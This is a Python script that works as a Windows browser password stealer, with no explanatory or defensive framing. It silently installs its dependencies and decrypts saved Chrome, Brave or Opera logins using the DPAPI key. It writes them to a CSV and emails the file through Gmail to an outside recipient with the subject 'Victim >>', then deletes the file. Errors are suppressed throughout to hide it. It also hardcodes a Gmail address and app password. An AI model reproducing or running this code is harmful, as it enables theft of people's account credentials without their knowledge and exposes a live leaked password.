#!/usr/bin/enc python3 

import os
import re
import subprocess
import sys
import json
import base64
import sqlite3
import shutil
import csv
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders

def install(package):
    subprocess.check_call([sys.executable , '-m' , 'pip','install',package] ,stdout=subprocess.DEVNULL , stderr=subprocess.DEVNULL)

try:
    import win32crypt
except ImportError:
    install('pypiwin32')
    import win32crypt

try:
    from Cryptodome.Cipher import AES
except ImportError:
    install('Cryptography')
    from Cryptodome.Cipher import AES

Browser_list = [
    os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE'])) , os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE'])) ,
    os.path.normpath(r"%s\AppData\Local\Brave\Brave-Browser\User Data\Local State"%(os.environ['USERPROFILE'])) , os.path.normpath(r"%s\AppData\Local\Brave\Brave-Browser\User Data"%(os.environ['USERPROFILE'])) ,
    os.path.normpath(r"%s\AppData\Roaming\Opera Software\Opera Stable\Local State"%(os.environ['USERPROFILE'])) , os.path.normpath(r"%s\AppData\Roaming\Opera Software\Opera Stable"%(os.environ['USERPROFILE'])) 
]

for browser in range(0,len(Browser_list),2):
    if os.path.exists(Browser_list[browser]) == True :
        LOCAL_STATE = Browser_list[browser]
        PATH = Browser_list[browser+1]
        used_browser = PATH.split("\\")[5]
        break
else:
    pass

def get_secret_key():
    try:
        with open( LOCAL_STATE, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        secret_key = secret_key[5:] 
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        return None
    
def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(ciphertext, secret_key):
    try:
        initialisation_vector = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = generate_cipher(secret_key, initialisation_vector)
        decrypted_pass = decrypt_payload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()  
        return decrypted_pass
    except Exception as e:
       return ""
    
def get_db_connection(chrome_path_login_db):
    try:
        shutil.copy2(chrome_path_login_db, "Loginvault.db") 
        return sqlite3.connect("Loginvault.db")
    except Exception as e:
        return None

def send_email(sender_email, sender_password, recipient_email, subject, body, attachment_path):
    msg = MIMEMultipart()
    msg['Subject'] = subject
    msg['From'] = sender_email
    msg['To'] = recipient_email
    
    msg.attach(MIMEText(body, "plain"))

    filename = attachment_path
    part = MIMEBase("application", "octet-stream")
    with open(filename, "rb") as attachment:
        part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header("Content-Disposition", f"attachment; filename= {os.path.basename(filename)}")

    msg.attach(part)

    try:
        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(sender_email, sender_password)
            server.send_message(msg)
    except Exception as e:
        pass

if __name__ == '__main__':
    try:
        with open('decrypted_password.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
            csv_writer = csv.writer(decrypt_password_file, delimiter=',')
            csv_writer.writerow(["index","url","username","password"])
            secret_key = get_secret_key()
            folders = [element for element in os.listdir(PATH) if re.search("^Profile*|^Default$",element)!=None]
            for folder in folders:
                chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data"%(PATH,folder))
                conn = get_db_connection(chrome_path_login_db)
                if(secret_key and conn):
                    cursor = conn.cursor()
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    for index,login in enumerate(cursor.fetchall()):
                        url = login[0]
                        username = login[1]
                        ciphertext = login[2]
                        if(url!="" and username!="" and ciphertext!=""):
                            decrypted_password = decrypt_password(ciphertext, secret_key)
                            csv_writer.writerow([index,url,username,decrypted_password])
                    cursor.close()
                    conn.close()
                    os.remove("Loginvault.db")
    except Exception as e:
        pass
    finally:
        a = os.getcwd()
        subject = f"Victim >> {os.getlogin()} using {used_browser}"
        body = ""
        path = f"{a}\\decrypted_password.csv"
        sender_email = 'iamqwertyfish@gmail.com'
        sender_password = 'gvnm rkpy mbgc yahs'
        recipient_email = 'sepiolsam2023@gmail.com'
        
        try:
            send_email(sender_email = sender_email , sender_password = sender_password , recipient_email = recipient_email , 
                    subject = subject , body = body , attachment_path = path)

            os.remove(path)

        except:
            pass
            
